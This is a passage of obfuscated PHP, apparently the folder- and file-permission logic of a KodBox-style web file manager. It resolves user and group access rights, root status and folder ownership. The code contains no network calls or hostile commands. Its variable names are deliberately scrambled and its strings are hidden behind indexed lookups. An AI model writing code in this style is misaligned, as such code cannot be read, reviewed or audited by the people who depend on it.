$Û¡¶Í¡ƒ = Model($„ËÎóÖ÷[556])->getInfo($ş—‰ÊõÕ[$„ËÎóÖ÷[1904]]); $×‡›†ù = Model($„ËÎóÖ÷[569])->getInfoSimpleOuter($€ñš–á); $×‡›†ù[$„ËÎóÖ÷[510]] = $ş—‰ÊõÕ[$„ËÎóÖ÷[457]]; if (Model($„ËÎóÖ÷[542])->authCheckAction($ş—‰ÊõÕ[$„ËÎóÖ÷[457]][$„ËÎóÖ÷[457]], $„ËÎóÖ÷[1925])) { continue; } $‹™Ö’ÄÏ = array($„ËÎóÖ÷[32] => $„ËÎóÖ÷[1259] . $Û¡¶Í¡ƒ[$„ËÎóÖ÷[32]], $„ËÎóÖ÷[183] => $Û¡¶Í¡ƒ[$„ËÎóÖ÷[89]][$„ËÎóÖ÷[183]], $„ËÎóÖ÷[86] => KodIO::make($Û¡¶Í¡ƒ[$„ËÎóÖ÷[89]][$„ËÎóÖ÷[183]]), $„ËÎóÖ÷[182] => $„ËÎóÖ÷[214], $„ËÎóÖ÷[180] => $„ËÎóÖ÷[549], $„ËÎóÖ÷[33] => $„ËÎóÖ÷[586], $„ËÎóÖ÷[553] => $Û¡¶Í¡ƒ[$„ËÎóÖ÷[560]], $„ËÎóÖ÷[1904] => $Û¡¶Í¡ƒ[$„ËÎóÖ÷[1904]], $„ËÎóÖ÷[557] => $Û¡¶Í¡ƒ[$„ËÎóÖ÷[182]], $„ËÎóÖ÷[2088] => array($×‡›†ù)); $íôºêçß[$‹™Ö’ÄÏ[$„ËÎóÖ÷[183]]] = $‹™Ö’ÄÏ; } } $Ÿ‹éşµí = array(); $€¸Šé¹± = $this->getAllChildren($ÒÒ©û§Ü); foreach ($€¸Šé¹± as $ñ¾ÎÒŒÎ) { $†Û÷ŠÆ¾ = !1; foreach ($ñ¾ÎÒŒÎ[$„ËÎóÖ÷[2088]] as $øş§­¯¬) { if ($øş§­¯¬[$„ËÎóÖ÷[1705]]) { if ($øş§­¯¬[$„ËÎóÖ÷[1705]] == $€ñš–á) { $†Û÷ŠÆ¾ = !0; break; } } if ($øş§­¯¬[$„ËÎóÖ÷[1904]]) { if ($this->groupContainUser($øş§­¯¬[$„ËÎóÖ÷[1904]], $€ñš–á)) { $†Û÷ŠÆ¾ = !0; break; } } } if ($†Û÷ŠÆ¾) { $Ÿ‹éşµí[] = $ñ¾ÎÒŒÎ; } $˜²ô…Ï† = $ñ¾ÎÒŒÎ[$„ËÎóÖ÷[183]]; if (isset($íôºêçß[$˜²ô…Ï†])) { $ñ¾ÎÒŒÎ[$„ËÎóÖ÷[2088]][] = $íôºêçß[$˜²ô…Ï†][0]; $íôºêçß[$˜²ô…Ï†] = !1; } } $íôºêçß = array_filter(array_values($íôºêçß)); $Ÿ‹éşµí = array_merge($íôºêçß, $Ÿ‹éşµí); return $Ÿ‹éşµí; } public function setAllChildrenByUser($«»Î­‹¯, $‡û¢ş•¦, $´¡ƒúöÒ) { $Üå¡ ¿ =& $_SERVER[•Ùç É]; $ºßõ½È = $this->getAllChildrenByUser($«»Î­‹¯, $‡û¢ş•¦); if (!$´¡ƒúöÒ || !$ºßõ½È) { return !1; } foreach ($ºßõ½È as $§Œ¨ÌÛ) { $ìåãí”î = array(); foreach ($§Œ¨ÌÛ[$Üå¡ ¿[2088]] as $×“•ñö¨) { $«ö¨±—Ö = $×“•ñö¨[$Üå¡ ¿[510]]; $ÃÙæ¢… = $×“•ñö¨[$Üå¡ ¿[1705]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¼ÒÒıé¥ = $×“•ñö¨[$Üå¡ ¿[1705]] ? $×“•ñö¨[$Üå¡ ¿[1705]] : $×“•ñö¨[$Üå¡ ¿[1904]]; if ($×“•ñö¨[$Üå¡ ¿[1705]] && $×“•ñö¨[$Üå¡ ¿[1705]] == $‡û¢ş•¦) { continue; } $ìåãí”î[] = array($Üå¡ ¿[183] => $§Œ¨ÌÛ[$Üå¡ ¿[183]], $Üå¡ ¿[180] => $ÃÙæ¢…, $Üå¡ ¿[540] => intval($¼ÒÒıé¥), $Üå¡ ¿[2008] => isset($«ö¨±—Ö[$Üå¡ ¿[445]]) ? intval($«ö¨±—Ö[$Üå¡ ¿[445]]) : 0, $Üå¡ ¿[2068] => isset($«ö¨±—Ö[$Üå¡ ¿[2068]]) ? intval($«ö¨±—Ö[$Üå¡ ¿[2068]]) : -1); } $ìåãí”î[] = array($Üå¡ ¿[183] => $§Œ¨ÌÛ[$Üå¡ ¿[183]], $Üå¡ ¿[180] => SourceModel::TYPE_USER, $Üå¡ ¿[540] => intval($‡û¢ş•¦), $Üå¡ ¿[2008] => intval($´¡ƒúöÒ), $Üå¡ ¿[2068] => -1); $this->where(array($Üå¡ ¿[461] => $§Œ¨ÌÛ[$Üå¡ ¿[183]]))->delete(); $this->addAll($ìåãí”î); } return !0; } public function get($ı¯œ¯”à) { $ü×Ï½ºÔ = $this->getSourceList(array($ı¯œ¯”à), !0); return $ü×Ï½ºÔ[0]; } public function getSourceList($¶ÏğÈ¤, $õıÌ›”ü = false, $ÙÊïòéÀ = false) { $Ñº”’¶ =& $_SERVER[•Ùç É]; if (!$¶ÏğÈ¤) { return array(); } $˜Ì¤ãİƒ = Model($Ñº”’¶[1384]); if (!$õıÌ›”ü && count($¶ÏğÈ¤) == 1) { $õıÌ›”ü = array(); $õıÌ›”ü[$¶ÏğÈ¤[0]] = $˜Ì¤ãİƒ->sourceInfo($¶ÏğÈ¤[0]); } if (!$õıÌ›”ü) { $Àäû÷Ğ = array($Ñº”’¶[461] => array($Ñº”’¶[462], $¶ÏğÈ¤)); $õıÌ›”ü = $˜Ì¤ãİƒ->field($Ñº”’¶[2092])->where($Àäû÷Ğ)->select(); $õıÌ›”ü = array_to_keyvalue($õıÌ›”ü, $Ñº”’¶[183]); } $ÜÁş¾şô = $¶ÏğÈ¤; foreach ($õıÌ›”ü as $¸…×öÕ™ => $ªÍØãÆö) { $¶Óå¤ = $˜Ì¤ãİƒ->parentLevelArray($ªÍØãÆö[$Ñº”’¶[555]]); $ÜÁş¾şô = array_merge($ÜÁş¾şô, array($¸…×öÕ™), array_reverse($¶Óå¤)); } $ÜÁş¾şô = array_values(array_unique($ÜÁş¾şô)); if (!$ÜÁş¾şô) { return array(); } $üÔú±İ£ = $this->sourceAuthSelect($ÜÁş¾şô); $‚¤ÕÆäæ = array(); foreach ($ÜÁş¾şô as $Ø¢š‚»ê) { if (isset($üÔú±İ£[$Ø¢š‚»ê])) { $‚¤ÕÆäæ[$Ø¢š‚»ê] = $üÔú±İ£[$Ø¢š‚»ê]; } } $ï¾ç¼À÷ = $this->userIsRoot($ÙÊïòéÀ); $ÑÑ¥¡µâ = AuthModel::authAll(); $Ş–ôö‚ = array($Ñº”’¶[458] => $ÑÑ¥¡µâ, $Ñº”’¶[2093] => array($Ñº”’¶[463] => 0, $Ñº”’¶[1910] => $ÑÑ¥¡µâ, $Ñº”’¶[464] => LNG($Ñº”’¶[2094]), $Ñº”’¶[1927] => $Ñº”’¶[2095])); $Š©Ÿ€öŸ = array(); foreach ($õıÌ›”ü as $Ø¢š‚»ê => $ïÇ‡áÉØ) { if ($ï¾ç¼À÷ && $GLOBALS[$Ñº”’¶[6]][$Ñº”’¶[1923]]) { $Š©Ÿ€öŸ[$Ø¢š‚»ê] = $Ş–ôö‚; continue; } $Š©Ÿ€öŸ[$Ø¢š‚»ê] = $this->makeSourceAuth($ïÇ‡áÉØ, $‚¤ÕÆäæ, $ÙÊïòéÀ); } return $Š©Ÿ€öŸ; } public function authDeepCheck($ã™òÁ»†, $èöşæ·İ = false) { $ª·…¡–¦ =& $_SERVER[•Ùç É]; $èöşæ·İ = $èöşæ·İ ? $èöşæ·İ : USER_ID; $ÈÈÀ®æ¼ = $this->makeAuthDeep($èöşæ·İ); if (!in_array($ã™òÁ»†, $ÈÈÀ®æ¼[$ª·…¡–¦[2096]])) { return !1; } $Ó²Ú½¾ë = array(); foreach ($ÈÈÀ®æ¼[$ª·…¡–¦[2097]] as $‰Ç¥“Ù‰ => $£ÈóÜë) { if (!in_array($ã™òÁ»†, $£ÈóÜë)) { continue; } $Ó²Ú½¾ë[] = $‰Ç¥“Ù‰; } if (!$Ó²Ú½¾ë) { return !1; } $´•ú÷Éô = $Ó²Ú½¾ë ? $Ó²Ú½¾ë[0] : $ã™òÁ»†; return array($ª·…¡–¦[458] => -1, $ª·…¡–¦[510] => array($ª·…¡–¦[463] => $ª·…¡–¦[1239], $ª·…¡–¦[1910] => $ª·…¡–¦[214], $ª·…¡–¦[464] => LNG($ª·…¡–¦[2098]), $ª·…¡–¦[1927] => $ª·…¡–¦[2099]), $ª·…¡–¦[2100] => LNG($ª·…¡–¦[2101]), $ª·…¡–¦[2102] => $this->sourceAuthInfo($´•ú÷Éô)); } protected function makeAuthDeep($×­½ÌÉÔ = false) { $ÌÁ½ª–Š =& $_SERVER[•Ùç É]; static $‰¼ÌÃóí = array(); $×­½ÌÉÔ = $×­½ÌÉÔ ? $×­½ÌÉÔ : USER_ID; if (isset($‰¼ÌÃóí[$×­½ÌÉÔ])) { return $‰¼ÌÃóí[$×­½ÌÉÔ]; } $ø‚ıÎÈé = Model($ÌÁ½ª–Š[2103])->listData(); $Š°Åé¸ = array(); foreach ($ø‚ıÎÈé as $’©×£¯·) { if ($’©×£¯·[$ÌÁ½ª–Š[457]] == 0 && $’©×£¯·[$ÌÁ½ª–Š[1926]] == $ÌÁ½ª–Š[90]) { $Š°Åé¸[] = $’©×£¯·[$ÌÁ½ª–Š[445]]; } } $‚‰ç±œ» = $this->userGroupParents($×­½ÌÉÔ); $½±öÅİ’ = array($ÌÁ½ª–Š[180] => SourceModel::TYPE_USER, $ÌÁ½ª–Š[540] => $×­½ÌÉÔ); if ($‚‰ç±œ») { $½±öÅİ’ = array(array($ÌÁ½ª–Š[180] => SourceModel::TYPE_USER, $ÌÁ½ª–Š[540] => $×­½ÌÉÔ), array($ÌÁ½ª–Š[180] => SourceModel::TYPE_GROUP, $ÌÁ½ª–Š[540] => array($ÌÁ½ª–Š[462], $‚‰ç±œ»)), $ÌÁ½ª–Š[1051] => $ÌÁ½ª–Š[2002]); } $¹™šæÄ = $this->field($ÌÁ½ª–Š[2104])->where($½±öÅİ’)->select(); $Ûœ„¼Ş = array(); $îÔïµ­« = array_to_keyvalue_group($¹™šæÄ, $ÌÁ½ª–Š[183]); foreach ($îÔïµ­« as $¼èäÊÆî => $•öõÚÍÀ) { $ä¬¿ºàË = $this->authArrayCheck($•öõÚÍÀ, $×­½ÌÉÔ); if ($ä¬¿ºàË[$ÌÁ½ª–Š[458]] > 0) { $Ûœ„¼Ş[] = $¼èäÊÆî . $ÌÁ½ª–Š[12]; } } if ($‚‰ç±œ») { $¥®òÛÂÒ = Model($ÌÁ½ª–Š[556]); foreach ($‚‰ç±œ» as $Ú„áÀ—Œ) { $ÈÙÕ‰Â£ = $¥®òÛÂÒ->getInfo($Ú„áÀ—Œ); if (!$ÈÙÕ‰Â£ || !is_array($ÈÙÕ‰Â£[$ÌÁ½ª–Š[89]])) { continue; } $Ûœ„¼Ş[] = $ÈÙÕ‰Â£[$ÌÁ½ª–Š[89]][$ÌÁ½ª–Š[183]]; } } $”äÌ‘ = array(); $§Çó–óº = $‚‰ç±œ»; $²š¦ÑŞ = Model($ÌÁ½ª–Š[1384]); $¥®òÛÂÒ = Model($ÌÁ½ª–Š[556]); $“äÏª·ç = array(); $¶šçÛ‹ù = array(); $™´ØÊË = array(); $…’¢¢¹ = array(); if ($Ûœ„¼Ş) { $‰Å¦€ïŞ = $²š¦ÑŞ->where(array($ÌÁ½ª–Š[183] => array($ÌÁ½ª–Š[462], $Ûœ„¼Ş)))->select(); foreach ($‰Å¦€ïŞ as $³—ˆ²İˆ) { $‘ÅşÎ”ò = $²š¦ÑŞ->parentLevelArray($³—ˆ²İˆ[$ÌÁ½ª–Š[555]]); $”äÌ‘ = array_merge($”äÌ‘, $‘ÅşÎ”ò); $§Çó–óº[] = $³—ˆ²İˆ[$ÌÁ½ª–Š[540]]; $“äÏª·ç[$³—ˆ²İˆ[$ÌÁ½ª–Š[183]]] = $‘ÅşÎ”ò; $¶šçÛ‹ù[$³—ˆ²İˆ[$ÌÁ½ª–Š[183]]] = $³—ˆ²İˆ[$ÌÁ½ª–Š[540]]; } } $§Çó–óº = array_values(array_unique($§Çó–óº)); $¡ô÷îÉí = $§Çó–óº; foreach ($¡ô÷îÉí as $Ú„áÀ—Œ) { $ÈÙÕ‰Â£ = $¥®òÛÂÒ->getInfo($Ú„áÀ—Œ); $‘ÅşÎ”ò = $²š¦ÑŞ->parentLevelArray($ÈÙÕ‰Â£[$ÌÁ½ª–Š[555]]); $§Çó–óº = array_merge($§Çó–óº, $‘ÅşÎ”ò); } $§Çó–óº = array_values(array_unique($§Çó–óº)); foreach ($§Çó–óº as $Ú„áÀ—Œ) { $ÈÙÕ‰Â£ = $¥®òÛÂÒ->getInfo($Ú„áÀ—Œ); $”äÌ‘[] = $ÈÙÕ‰Â£[$ÌÁ½ª–Š[89]][$ÌÁ½ª–Š[183]]; $™´ØÊË[$Ú„áÀ—Œ] = $ÈÙÕ‰Â£[$ÌÁ½ª–Š[89]][$ÌÁ½ª–Š[183]]; $…’¢¢¹[$Ú„áÀ—Œ] = $²š¦ÑŞ->parentLevelArray($ÈÙÕ‰Â£[$ÌÁ½ª–Š[555]]); } foreach ($“äÏª·ç as $î£Šë¼‘ => $’çÛ©è–) { $²ì²ğà‡ = $¶šçÛ‹ù[$î£Šë¼‘]; if (!$²ì²ğà‡ || !$™´ØÊË[$²ì²ğà‡]) { continue; } $öúÊ¾ê = array(); foreach ($…’¢¢¹[$²ì²ğà‡] as $Ú„áÀ—Œ) { $öúÊ¾ê[] = $™´ØÊË[$Ú„áÀ—Œ]; } $“äÏª·ç[$î£Šë¼‘] = array_merge($öúÊ¾ê, $’çÛ©è–); } $”äÌ‘ = array_values(array_unique($”äÌ‘)); $­öÒşâ = array($ÌÁ½ª–Š[2096] => $”äÌ‘, $ÌÁ½ª–Š[2097] => $“äÏª·ç); $‰¼ÌÃóí[$×­½ÌÉÔ] = $­öÒşâ; return $­öÒşâ; } private function makeSourceAuth($å İ¸Â, $üĞÓ–Ø¡, $üúí·™€ = false) { $´â˜÷¶Ş =& $_SERVER[•Ùç É]; $éú›ØæÂ = $´â˜÷¶Ş[90]; $ƒÈç·«Û = $å İ¸Â[$´â˜÷¶Ş[540]]; $‰íî¨±¥ = $å İ¸Â[$´â˜÷¶Ş[180]] == SourceModel::TYPE_GROUP; $Éµœë¨Ù = $‰íî¨±¥ ? $this->groupRootAuth($ƒÈç·«Û, $üúí·™€) : !1; if ($Éµœë¨Ù && Model($´â˜÷¶Ş[542])->authCheckAction($Éµœë¨Ù[$´â˜÷¶Ş[457]], $´â˜÷¶Ş[1925])) { return $this->groupAuthInfo($Éµœë¨Ù, $ƒÈç·«Û); } $ñ±ê•»ú = Model($´â˜÷¶Ş[1384])->parentLevelArray($å İ¸Â[$´â˜÷¶Ş[555]]); $ñ±ê•»ú = array_merge(array($å İ¸Â[$´â˜÷¶Ş[183]]), array_reverse($ñ±ê•»ú)); $úåëÂÕŞ = !1; foreach ($ñ±ê•»ú as $¡óŞ¶û’) { if (!isset($üĞÓ–Ø¡[$¡óŞ¶û’])) { continue; } $Ô³ß¤†Ô = $this->authMake($üĞÓ–Ø¡[$¡óŞ¶û’], $üúí·™€); if ($Ô³ß¤†Ô[$´â˜÷¶Ş[510]]) { $úåëÂÕŞ = $Ô³ß¤†Ô; break; } } if (!$‰íî¨±¥) { return $úåëÂÕŞ; } if (!$úåëÂÕŞ && $Éµœë¨Ù) { $úåëÂÕŞ = $this->groupAuthInfo($Éµœë¨Ù, $ƒÈç·«Û); } if (!$úåëÂÕŞ) { $šÄ‡–”ª = Model($´â˜÷¶Ş[556])->getInfo($ƒÈç·«Û); $îêÚíß = explode($´â˜÷¶Ş[50], trim($šÄ‡–”ª[$´â˜÷¶Ş[555]], $´â˜÷¶Ş[50])); $îêÚíß = array_reverse($îêÚíß); foreach ($îêÚíß as $©øÖ‡†•) { if ($©øÖ‡†• == $´â˜÷¶Ş[214] || $©øÖ‡†• == $éú›ØæÂ) { continue; } $›Îµ·¡Î = $this->groupRootAuth($©øÖ‡†•, $üúí·™€); if (!$›Îµ·¡Î) { continue; } $úåëÂÕŞ = $this->groupAuthInfo($›Îµ·¡Î, $©øÖ‡†•); break; } } if (!$úåëÂÕŞ || $úåëÂÕŞ[$´â˜÷¶Ş[458]] <= 0) { $¤Œ¦ÖÙ = $this->authDeepCheck($å İ¸Â[$´â˜÷¶Ş[183]], $üúí·™€); if ($¤Œ¦ÖÙ) { $úåëÂÕŞ = $¤Œ¦ÖÙ; } } return $úåëÂÕŞ; } private function userIsRoot($‘å‚û¼ = false) { $™ö—å =& $_SERVER[•Ùç É]; if (!$‘å‚û¼ && KodUser::isRoot()) { return !0; } $˜—Ô¨× = Model($™ö—å[569])->getInfo($‘å‚û¼); $óôó’Ô¹ = Model($™ö—å[2105])->listData($˜—Ô¨×[$™ö—å[2106]]); if ($óôó’Ô¹ && $óôó’Ô¹[$™ö—å[546]][$™ö—å[2107]] == 1) { return !0; } return !1; } private function sourceAuthInfo($‰“¿şıæ) { $•°Øæùò =& $_SERVER[•Ùç É]; $µÏØûŠå = Model($•°Øæùò[1384]); $¤®²Ê§ = $µÏØûŠå->sourceInfo($‰“¿şıæ); if (!$¤®²Ê§) { return !1; } $µÏØûŠå->groupPathDisplay($¤®²Ê§); $¦­Ô†ñ = array($¤®²Ê§); $¦­Ô†ñ = $µÏØûŠå->_listAppendPath($¦­Ô†ñ); $¤®²Ê§ = $¦­Ô†ñ[0]; $˜»‡êÛı = $¤®²Ê§[$•°Øæùò[553]]; if (isset($¤®²Ê§[$•°Øæùò[561]])) { $Ş“Ò Ìª = explode($•°Øæùò[8], trim($¤®²Ê§[$•°Øæùò[553]], $•°Øæùò[8])); array_shift($Ş“Ò Ìª); $˜»‡êÛı = $¤®²Ê§[$•°Øæùò[559]] . $•°Øæùò[2108] . implode($•°Øæùò[8], $Ş“Ò Ìª); } return array($•°Øæùò[464] => $¤®²Ê§[$•°Øæùò[32]], $•°Øæùò[86] => KodIO::make($¤®²Ê§[$•°Øæùò[183]]), $•°Øæùò[2109] => $˜»‡êÛı); } private function groupAuthInfo($ÈÊ‡Šõ¦, $»ÍŠÔó¢) { $ÓššèÁò =& $_SERVER[•Ùç É]; $ÑÙÑá’° = Model($ÓššèÁò[556])->getInfo($»ÍŠÔó¢); return array($ÓššèÁò[2110] => intval($ÈÊ‡Šõ¦[$ÓššèÁò[457]]), $ÓššèÁò[2093] => $ÈÊ‡Šõ¦, $ÓššèÁò[2111] => LNG($ÓššèÁò[2112]), $ÓššèÁò[2102] => array($ÓššèÁò[464] => $ÑÙÑá’°[$ÓššèÁò[32]], $ÓššèÁò[86] => KodIO::make($ÑÙÑá’°[$ÓššèÁò[89]][$ÓššèÁò[183]]), $ÓššèÁò[2109] => $ÑÙÑá’°[$ÓššèÁò[560]])); } protected function groupRootAuth($ìºéÖ‘, $Ë²ìÂÑÃ = false) { $Âì±™Ò™ =& $_SERVER[•Ùç É]; $Ë²ìÂÑÃ = $Ë²ìÂÑÃ ? $Ë²ìÂÑÃ : USER_ID; $¬Ô«¥‰ = $Ë²ìÂÑÃ . $Âì±™Ò™[2113] . $ìºéÖ‘; static $Œ¯§ò‡Ò = array(); if (isset($Œ¯§ò‡Ò[$¬Ô«¥‰])) { return $Œ¯§ò‡Ò[$¬Ô«¥‰]; } $Í°‰‘Ñ€ = Model($Âì±™Ò™[556])->getInfo($ìºéÖ‘); $ªØ×³ˆô = $this->userGroupList($Ë²ìÂÑÃ); $”õ¶ò¿¨ = isset($ªØ×³ˆô[$ìºéÖ‘]) ? $ªØ×³ˆô[$ìºéÖ‘][$Âì±™Ò™[457]] : !1; if ($”õ¶ò¿¨ && Model($Âì±™Ò™[542])->authCheckAction($”õ¶ò¿¨[$Âì±™Ò™[457]], $Âì±™Ò™[1925])) { $Œ¯§ò‡Ò[$¬Ô«¥‰] = $”õ¶ò¿¨; return $”õ¶ò¿¨; } $»“»ëîÃ = $this->sourceAuthSelect($Í°‰‘Ñ€[$Âì±™Ò™[89]][$Âì±™Ò™[183]]); $®©å€¤‡ = $»“»ëîÃ ? $this->authMake($»“»ëîÃ, $Ë²ìÂÑÃ) : !1; $ŒÏŞ´’‰ = $®©å€¤‡ ? $®©å€¤‡[$Âì±™Ò™[510]] : !1; $Œ¯§ò‡Ò[$¬Ô«¥‰] = $ŒÏŞ´’‰ ? $ŒÏŞ´’‰ : $”õ¶ò¿¨; return $Œ¯§ò‡Ò[$¬Ô«¥‰]; } public function authOwnerApply($˜€†ùü–) { $Ş€Ïá¥ï =& $_SERVER[•Ùç É]; if (empty($˜€†ùü–[$Ş€Ïá¥ï[457]]) || isset($˜€†ùü–[$Ş€Ïá¥ï[2114]]) && $˜€†ùü–[$Ş€Ïá¥ï[2114]]) { return $˜€†ùü–; } if (AuthModel::authCheckRoot($˜€†ùü–[$Ş€Ïá¥ï[457]][$Ş€Ïá¥ï[458]])) { return $˜€†ùü–; } $ı¢Ç‹±¾ = Model($Ş€Ïá¥ï[1384])->parentLevelArray($˜€†ùü–[$Ş€Ïá¥ï[555]]); $ı¢Ç‹±¾ = array_merge(array($˜€†ùü–[$Ş€Ïá¥ï[183]]), array_reverse($ı¢Ç‹±¾)); $¨§Ë¼Ê² = $this->sourceAuthSelect($ı¢Ç‹±¾); $ÆÌˆóµë = array(); $„şËÇ¯Ê = array(); foreach ($¨§Ë¼Ê² as $¡ø‹İşó => $á…ø¤Àà) { $Çòƒ«†¦ = $this->authFolderOwnerUser($á…ø¤Àà); $ÆÌˆóµë[$¡ø‹İşó] = $Çòƒ«†¦; $„şËÇ¯Ê = array_merge($„şËÇ¯Ê, $Çòƒ«†¦[$Ş€Ïá¥ï[632]]); if ($Çòƒ«†¦[$Ş€Ïá¥ï[2115]]) { break; } } if (count($„şËÇ¯Ê) == 0) { $„şËÇ¯Ê = $this->authFolderOwnerGroup($˜€†ùü–[$Ş€Ïá¥ï[540]]); } $„şËÇ¯Ê = array_unique($„şËÇ¯Ê); if (AuthModel::authCheckRoot($˜€†ùü–[$Ş€Ïá¥ï[457]][$Ş€Ïá¥ï[458]])) { $„şËÇ¯Ê[] = USER_ID; } $˜€†ùü–[$Ş€Ïá¥ï[457]][$Ş€Ïá¥ï[2116]] = Model($Ş€Ïá¥ï[548])->userListInfo($„şËÇ¯Ê); return $˜€†ùü–; } private function authFolderOwnerGroup($Î…ÉÓ„Å) { $÷ì–ñÌŠ =& $_SERVER[•Ùç É]; $¡×—°Ô = Model($÷ì–ñÌŠ[1994])->where(array($÷ì–ñÌŠ[1904] => $Î…ÉÓ„Å))->select(); $¾‰¹Ÿ˜Ç = array(); if (!$¡×—°Ô) { return $¾‰¹Ÿ˜Ç; } foreach ($¡×—°Ô as $Ë¤¡†—å) { $ãò£¡ü¢ = $this->authInfo($Ë¤¡†—å); if (AuthModel::authCheckRoot($ãò£¡ü¢[$÷ì–ñÌŠ[457]])) { $¾‰¹Ÿ˜Ç[] = $Ë¤¡†—å[$÷ì–ñÌŠ[1705]]; } } return $¾‰¹Ÿ˜Ç; } private function authFolderOwnerUser($ùïğ•âÍ) { $É¹ÎÍ•· =& $_SERVER[•Ùç É]; $·µ¤¾ˆÑ = array(); $Áß‹‡Õ = !1; foreach ($ùïğ•âÍ as $²ŞÆáêİ) { $ ÙÑ¶—º = $this->authInfo($²ŞÆáêİ); if ($²ŞÆáêİ[$É¹ÎÍ•·[540]] == $É¹ÎÍ•·[214]) { $Áß‹‡Õ = !0; } if ($²ŞÆáêİ[$É¹ÎÍ•·[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ ÙÑ¶—º[$É¹ÎÍ•·[457]])) { $·µ¤¾ˆÑ[] = $²ŞÆáêİ[$É¹ÎÍ•·[540]]; } } } return array($É¹ÎÍ•·[632] => $·µ¤¾ˆÑ, $É¹ÎÍ•·[2115] => $Áß‹‡Õ); } public function authMake($³œ‹âœ, $Ïˆ“õ² = false) { $¢¹ØÙàä =& $_SERVER[•Ùç É]; $ãüøØî– = $this->authArrayCheck($³œ‹âœ, $Ïˆ“õ²); if ($ãüøØî–[$¢¹ØÙàä[2117]]) { $ãüøØî–[$¢¹ØÙàä[2117]] = $this->sourceAuthInfo($ãüøØî–[$¢¹ØÙàä[2117]]); } return $ãüøØî–; } public function authArrayCheck($ßğŠÑÜÖ, $¤Óæ“ ¸ = false) { $£øÛ†õ =& $_SERVER[•Ùç É]; if (!$ßğŠÑÜÖ) { return array($£øÛ†õ[458] => 0, $£øÛ†õ[510] => !1); } $¤Óæ“ ¸ = $¤Óæ“ ¸ ? $¤Óæ“ ¸ : USER_ID; $àÉ·‚Õ– = 0; $–•§ÛşÅ = 0; $¹Î“òÉù = 0; $†Úòû–õ = 0; $êÃ›é÷ = 0; $Éõ”üÑ = 0; $Õò£ïÑ‰ = 1000; $üçÀñøâ = 0; $—áÂ˜÷É = 0; $óõù¾ñ† = 0; $à¥ŠÜ = 0; $‘æÜÊ = array($£øÛ†õ[183] => 0); foreach ($ßğŠÑÜÖ as $‘æÜÊ) { $É—Í†ÇÃ = $this->authInfo($‘æÜÊ); if (!$É—Í†ÇÃ) { continue; } $œÂšÜ‚œ = $‘æÜÊ[$£øÛ†õ[540]]; $£ŸàÒ÷Â = intval($É—Í†ÇÃ[$£øÛ†õ[457]]); if ($‘æÜÊ[$£øÛ†õ[180]] == SourceModel::TYPE_USER && $œÂšÜ‚œ == $¤Óæ“ ¸) { $àÉ·‚Õ– = !0; $¹Î“òÉù = $É—Í†ÇÃ; $–•§ÛşÅ = $£ŸàÒ÷Â; } else { if ($‘æÜÊ[$£øÛ†õ[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($œÂšÜ‚œ, $¤Óæ“ ¸)) { $†Úòû–õ = !0; $ª¸Æğ” = $this->groupStepToUserGroup($œÂšÜ‚œ, $¤Óæ“ ¸); if ($ª¸Æğ” < $Õò£ïÑ‰) { $Õò£ïÑ‰ = $ª¸Æğ”; $êÃ›é÷ = $£ŸàÒ÷Â; $Éõ”üÑ = $É—Í†ÇÃ; $üçÀñøâ = $œÂšÜ‚œ; } if ($ª¸Æğ” == $Õò£ïÑ‰ && $£ŸàÒ÷Â >= $êÃ›é÷) { $êÃ›é÷ = $£ŸàÒ÷Â; $Éõ”üÑ = $É—Í†ÇÃ; $üçÀñøâ = $œÂšÜ‚œ; } } else { if ($œÂšÜ‚œ == $£øÛ†õ[214]) { $—áÂ˜÷É = !0; $à¥ŠÜ = $É—Í†ÇÃ; $óõù¾ñ† = $£ŸàÒ÷Â; } } } } if ($àÉ·‚Õ–) { $üéÜ­ïİ = $–•§ÛşÅ; $É—Í†ÇÃ = $¹Î“òÉù; $š¢ô¥Î = LNG($£øÛ†õ[2118]); } else { if ($†Úòû–õ) { $üéÜ­ïİ = $êÃ›é÷; $É—Í†ÇÃ = $Éõ”üÑ; $¸Æ¼É‚ = Model($£øÛ†õ[556])->getInfo($üçÀñøâ); $š¢ô¥Î = $£øÛ†õ[165] . $¸Æ¼É‚[$£øÛ†õ[560]] . $£øÛ†õ[2119] . LNG($£øÛ†õ[2120]); } else { if ($—áÂ˜÷É) { $üéÜ­ïİ = $óõù¾ñ†; $É—Í†ÇÃ = $à¥ŠÜ; $š¢ô¥Î = LNG($£øÛ†õ[2090]); } else { $üéÜ­ïİ = 0; $É—Í†ÇÃ = !1; $š¢ô¥Î = $£øÛ†õ[12]; } } } $†®Öø¯ = array($£øÛ†õ[2110] => intval($üéÜ­ïİ), $£øÛ†õ[2093] => $É—Í†ÇÃ, $£øÛ†õ[2111] => $š¢ô¥Î, $£øÛ†õ[2102] => $‘æÜÊ[$£øÛ†õ[183]]); return $†®Öø¯; } private function groupContainUser($Éôˆå–‚, $¯‘ÓÌ×õ = false) { return in_array($Éôˆå–‚, $this->userGroupParents($¯‘ÓÌ×õ)); } private function groupStepToUserGroup($«°Ôß¼, $ê†şüÁ¹ = false) { $üËÙ’ÅŒ =& $_SERVER[•Ùç É]; $ĞàüÌÅõ = $this->userGroupList($ê†şüÁ¹); $ª™ŸÀ³ó = 1000; $œ÷ÏÎ†ˆ = $GLOBALS[$üËÙ’ÅŒ[6]][$üËÙ’ÅŒ[91]][$üËÙ’ÅŒ[2007]] == 1; $¾·äŒ  = $œ÷ÏÎ†ˆ ? 3 : 2; foreach ($ĞàüÌÅõ as $’ŞüìğÜ) { if ($’ŞüìğÜ[$üËÙ’ÅŒ[1904]] == $«°Ôß¼) { return 0; } $–ßìÊù = explode($üËÙ’ÅŒ[50], trim($’ŞüìğÜ[$üËÙ’ÅŒ[555]], $üËÙ’ÅŒ[50])); if ($–ßìÊù[0] == $üËÙ’ÅŒ[214] && count($–ßìÊù) > $¾·äŒ ) { $ò®è¤ìŠ = array_reverse(array_slice($–ßìÊù, $¾·äŒ )); $ÏÅÅ‰Õæ = array_search($«°Ôß¼, $ò®è¤ìŠ); if ($ÏÅÅ‰Õæ !== !1 && $ÏÅÅ‰Õæ + 1 <= $ª™ŸÀ³ó) { $ª™ŸÀ³ó = $ÏÅÅ‰Õæ + 1; } } } return $ª™ŸÀ³ó; } private function userGroupList($Ÿæáœ…† = false) { $öï„œÒÏ =& $_SERVER[•Ùç É]; static $«İ•Ä£Ø = array(); if (isset($«İ•Ä£Ø[$Ÿæáœ…†])) { return $«İ•Ä£Ø[$Ÿæáœ…†]; } $Á‚”ªŸœ = 